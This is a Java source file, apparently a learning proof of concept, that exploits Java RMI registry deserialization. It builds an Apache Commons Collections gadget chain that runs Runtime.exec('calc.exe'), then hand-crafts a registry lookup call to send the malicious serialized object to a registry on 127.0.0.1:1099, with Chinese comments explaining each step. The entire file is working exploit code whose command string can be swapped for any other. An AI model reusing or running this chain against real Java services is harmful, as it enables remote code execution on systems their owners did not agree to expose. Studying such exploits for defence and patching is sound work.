package com.lingx5.RMI;


import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import sun.rmi.server.UnicastRef;

import java.io.ObjectOutput;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.Operation;
import java.rmi.server.RemoteCall;
import java.rmi.server.RemoteObject;
import java.rmi.server.RemoteRef;
import java.util.HashMap;

public class expLookup {
    public static void main(String[] args) throws Exception{
        Transformer[] transforms = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})

        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transforms);
        LazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap(),new ConstantTransformer(null));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"lingx5");
        HashMap<Object, Object> HashMap = new HashMap<>();
        HashMap.put(tiedMapEntry,"lingx5");
        Field factory = LazyMap.class.getDeclaredField("factory");
        factory.setAccessible(true);
        factory.set(lazyMap,chainedTransformer);
        lazyMap.remove("lingx5");
        Class<?> aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = aClass.getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        constructor.newInstance(java.lang.annotation.Retention.class,HashMap);
        // 创建注册中心
        Registry registry = LocateRegistry.createRegistry(1099);
        Registry registry_remote = LocateRegistry.getRegistry("127.0.0.1", 1099);
        // 获取super.ref registry_remote为RegistryImpl_Stub对象，直接父类是RemoteStub，而ref实在RemoteStub的父类RemoteObject中定义的
        Field ref = registry_remote.getClass().getSuperclass().getSuperclass().getDeclaredField("ref");
        ref.setAccessible(true);
        UnicastRef remoteRefe = (UnicastRef) ref.get(registry_remote);
        Field declaredField = registry_remote.getClass().getDeclaredFields()[0];
        declaredField.setAccessible(true);
        Operation[] operations = (Operation[]) declaredField.get(registry_remote);
        // 跟着lookup的逻辑，执行newCall方法，2代表lookup方法
        RemoteCall remoteCall = remoteRefe.newCall((RemoteObject) registry_remote, operations, 2, 4905912898345647071L);
        // 写入序列化的恶意代码
        ObjectOutput outputStream = remoteCall.getOutputStream();
        outputStream.writeObject(HashMap);
        remoteRefe.invoke(remoteCall);
    }
}
